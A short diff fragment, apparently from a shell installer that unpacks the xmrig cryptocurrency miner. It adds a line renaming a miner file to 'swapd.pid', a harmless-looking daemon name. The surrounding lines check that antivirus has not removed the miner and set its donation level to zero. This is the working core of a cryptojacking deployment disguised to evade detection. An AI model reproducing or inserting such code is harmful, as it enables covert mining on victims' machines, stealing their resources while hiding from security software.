@@ -252,6 +252,7 @@ if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/; then
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
+mv $MOHOME/[crypto].pid $MOHOME/swapd.pid
 
 echo "[*] Checking if advanced version of $MOHOME/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/swapd.pid
